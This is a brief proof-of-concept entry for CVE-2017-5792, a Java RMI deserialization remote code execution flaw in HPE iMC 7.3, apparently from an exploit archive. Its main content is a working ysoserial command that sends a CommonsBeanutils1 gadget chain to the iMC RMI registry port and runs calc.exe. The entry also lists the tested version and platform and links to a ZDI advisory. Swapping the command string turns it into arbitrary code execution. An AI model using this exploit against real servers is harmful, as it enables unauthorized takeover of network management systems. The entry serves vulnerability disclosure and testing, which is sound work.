# HPE iMC 7.3 Java RMI Registry Deserialization RCE Vulnerability

# CVE ID 
CVE-2017-5792

# Exploit
Vendor Homepage: www.hpe.com

Version: iMC PLAT v7.3 (E0504) Standard

Tested on: Windows Server 2008 R2 Enterprise 64-bit

## note that this PoC will launch calc.exe
$ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.1.100 21195 CommonsBeanutils1 calc.exe

## Software Link
https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=19068&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=

# See Also
http://zerodayinitiative.com/advisories/ZDI-18-137/
